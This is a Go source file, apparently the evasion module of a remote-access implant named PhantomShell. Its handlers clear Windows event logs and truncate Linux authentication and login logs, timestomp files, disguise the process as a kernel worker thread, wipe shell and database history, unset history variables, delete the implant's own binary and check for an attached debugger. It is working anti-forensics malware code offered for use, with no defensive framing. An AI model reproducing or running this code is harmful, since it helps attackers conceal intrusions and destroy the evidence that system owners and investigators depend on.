package modules

import (
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/OmonovSarvar/PhantomShell/agents/go/core"
)

func RegisterEvasion(d *core.Dispatcher, exec *core.Executor) {
	d.Register("clean_logs", handleCleanLogs(exec))
	d.Register("timestomp", handleTimestomp)
	d.Register("mask_process", handleMaskProcess)
	d.Register("clean_history", handleCleanHistory(exec))
	d.Register("self_delete", handleSelfDelete)
	d.Register("unset_env", handleUnsetEnv)
	d.Register("anti_debug", handleAntiDebug)
}

func handleCleanLogs(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		if runtime.GOOS == "windows" {
			exec.Run("wevtutil cl System", 0)
			exec.Run("wevtutil cl Security", 0)
			exec.Run("wevtutil cl Application", 0)
			return map[string]interface{}{"status": "success", "method": "wevtutil"}
		}

		logFiles := []string{
			"/var/log/auth.log",
			"/var/log/syslog",
			"/var/log/messages",
			"/var/log/secure",
			"/var/log/wtmp",
			"/var/log/btmp",
			"/var/log/lastlog",
			"/var/run/utmp",
		}

		var cleaned []string
		var failed []string
		for _, path := range logFiles {
			if err := os.Truncate(path, 0); err == nil {
				cleaned = append(cleaned, path)
			} else {
				// Try with shell
				_, _, code := exec.Run(fmt.Sprintf("truncate -s 0 %s 2>/dev/null", path), 0)
				if code == 0 {
					cleaned = append(cleaned, path)
				} else {
					failed = append(failed, path)
				}
			}
		}

		return map[string]interface{}{
			"status":  "success",
			"cleaned": cleaned,
			"failed":  failed,
		}
	}
}

func handleTimestomp(args map[string]interface{}) map[string]interface{} {
	target := getString(args, "target")
	reference := getString(args, "reference")
	if target == "" || reference == "" {
		return map[string]interface{}{"status": "error", "error": "target and reference paths required"}
	}

	refInfo, err := os.Stat(reference)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": fmt.Sprintf("stat reference: %s", err)}
	}

	modTime := refInfo.ModTime()
	if err := os.Chtimes(target, modTime, modTime); err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}

	return map[string]interface{}{
		"status":    "success",
		"target":    target,
		"reference": reference,
		"timestamp": modTime.Format(time.RFC3339),
	}
}

// handleMaskProcess overwrites os.Args[0] to disguise the process name in ps output.
func handleMaskProcess(args map[string]interface{}) map[string]interface{} {
	name := getString(args, "name")
	if name == "" {
		name = "[kworker/0:0]" // common kernel thread name
	}
	os.Args[0] = name
	return map[string]interface{}{
		"status":   "success",
		"new_name": name,
	}
}

func handleCleanHistory(exec *core.Executor) core.Handler {
	return func(args map[string]interface{}) map[string]interface{} {
		if runtime.GOOS == "windows" {
			exec.Run("del /f /q %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul", 0)
			return map[string]interface{}{"status": "success", "method": "powershell_history"}
		}

		home := os.Getenv("HOME")
		histFiles := []string{
			home + "/.bash_history",
			home + "/.zsh_history",
			home + "/.python_history",
			home + "/.mysql_history",
			home + "/.psql_history",
		}

		var cleaned []string
		for _, path := range histFiles {
			if err := os.Truncate(path, 0); err == nil {
				cleaned = append(cleaned, path)
			}
		}

		// Unset HISTFILE to prevent future logging
		os.Unsetenv("HISTFILE")
		os.Setenv("HISTSIZE", "0")

		return map[string]interface{}{
			"status":  "success",
			"cleaned": cleaned,
		}
	}
}

func handleSelfDelete(args map[string]interface{}) map[string]interface{} {
	delay := getInt(args, "delay", 5)
	binary := os.Args[0]

	// Delete after a short delay to allow response to be sent
	go func() {
		time.Sleep(time.Duration(delay) * time.Second)
		os.Remove(binary)
		os.Exit(0)
	}()

	return map[string]interface{}{
		"status": "success",
		"binary": binary,
		"delay":  delay,
	}
}

func handleUnsetEnv(args map[string]interface{}) map[string]interface{} {
	// Unset common forensic/tracking environment variables
	vars := []string{
		"HISTFILE", "HISTSIZE", "HISTFILESIZE",
		"LD_PRELOAD", "LD_LIBRARY_PATH",
		"PROMPT_COMMAND",
	}

	// Also unset any user-specified vars
	if extra := getString(args, "vars"); extra != "" {
		vars = append(vars, strings.Split(extra, ",")...)
	}

	var cleared []string
	for _, v := range vars {
		v = strings.TrimSpace(v)
		if os.Getenv(v) != "" {
			os.Unsetenv(v)
			cleared = append(cleared, v)
		}
	}

	return map[string]interface{}{
		"status":  "success",
		"cleared": cleared,
	}
}

// handleAntiDebug checks for debugger attachment on Linux via /proc/self/status.
func handleAntiDebug(args map[string]interface{}) map[string]interface{} {
	if runtime.GOOS != "linux" {
		return map[string]interface{}{
			"status":   "success",
			"debugger": false,
			"note":     "check only supported on linux",
		}
	}

	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}

	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "TracerPid:") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				pid, _ := strconv.Atoi(parts[1])
				if pid != 0 {
					return map[string]interface{}{
						"status":     "success",
						"debugger":   true,
						"tracer_pid": pid,
					}
				}
			}
		}
	}

	return map[string]interface{}{
		"status":   "success",
		"debugger": false,
	}
}
